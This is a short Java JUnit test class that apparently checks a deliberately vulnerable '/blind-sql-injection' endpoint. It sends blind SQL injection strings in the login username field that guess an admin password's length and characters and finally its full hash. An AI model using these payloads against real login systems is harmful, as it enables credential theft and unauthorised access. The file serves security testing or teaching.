package vulnerabilities;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInfo;

public class BlindSqlInjectionTests extends TestBase {

    @Override
    protected String getEndpoint() {
        return "/blind-sql-injection";
    }

    @Test
    void testGuessPasswordLength(TestInfo testInfo) {
        testLogin(testInfo, "admin' AND LENGTH(password)=32 --", "");
    }

    @Test
    void testGuessPasswordFirstSymbol(TestInfo testInfo) {
        testLogin(testInfo, "admin' AND SUBSTR(password,1,1) = '2' --", "");
    }

    @Test
    void testGuessPasswordSecondSymbol(TestInfo testInfo) {
        testLogin(testInfo, "admin' AND SUBSTR(password,2,1) = '1' --", "");
    }

    @Test
    void testGuessPasswordFirstTwoLetters(TestInfo testInfo) {
        testLogin(testInfo, "admin' AND SUBSTR(password,1,2) = '21' --", "");
    }

    @Test
    void testGuessPassword(TestInfo testInfo) {
        testLogin(testInfo, "admin' AND SUBSTR(password,1,32) = '21232f297a57a5a743894a0e4a801fc3' --", "");
    }
}
